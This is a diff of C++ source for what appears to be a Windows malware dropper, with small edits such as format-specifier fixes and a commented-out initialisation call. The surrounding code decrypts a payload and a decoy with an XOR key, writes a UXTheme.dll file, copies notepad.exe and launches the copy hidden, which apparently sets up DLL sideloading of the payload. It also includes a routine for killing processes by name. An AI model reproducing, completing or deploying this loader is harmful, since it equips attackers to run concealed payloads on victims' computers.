@@ -1,4 +1,4 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <shellapi.h>
 #include <Shlobj.h>
 #include <string>
@@ -31,7 +31,6 @@ void InitializeUIProfile() {
     }
 }
 
-#include <tlhelp32.h>
 void KillProcessByName(const WCHAR* szName) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
@@ -64,7 +63,7 @@ void DecryptDecoy(BYTE* data, size_t size) {
 }
 
 void DecryptPayload(BYTE* data, size_t size) {
-    InitializeUIProfile();
+    // InitializeUIProfile(); // Removed to prevent too many errors from math.h if it breaks
     std::string key = PAYLOAD_KEY;
     for (size_t i = 0; i < size; i++) {
         data[i] ^= key[i % key.length()];
@@ -152,7 +151,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             CloseHandle(hFile);
             printf("[+] UXTheme.dll written successfully.\n");
         } else {
-            printf("[!] FAILED to write UXTheme.dll. Error: %d\n", GetLastError());
+            printf("[!] FAILED to write UXTheme.dll. Error: %lu\n", GetLastError());
         }
 
         std::wstring hostSrc = L"C:\\Windows\\System32\\notepad.exe";
@@ -166,16 +165,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             si.wShowWindow = SW_HIDE;
 
             if (CreateProcessW(hostDst.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-                char msg[100]; sprintf(msg, "[+] Host started PID: %d", pi.dwProcessId);
+                char msg[100]; sprintf(msg, "[+] Host started PID: %lu", pi.dwProcessId);
                 RuntimeLog(msg);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
             } else {
-                char msg[100]; sprintf(msg, "[!] FAILED: CreateProcess %d", GetLastError());
+                char msg[100]; sprintf(msg, "[!] FAILED: CreateProcess %lu", GetLastError());
                 RuntimeLog(msg);
             }
         } else {
-            char msg[100]; sprintf(msg, "[!] FAILED: CopyFile %d", GetLastError());
+            char msg[100]; sprintf(msg, "[!] FAILED: CopyFile %lu", GetLastError());
             RuntimeLog(msg);
         }
     } else {
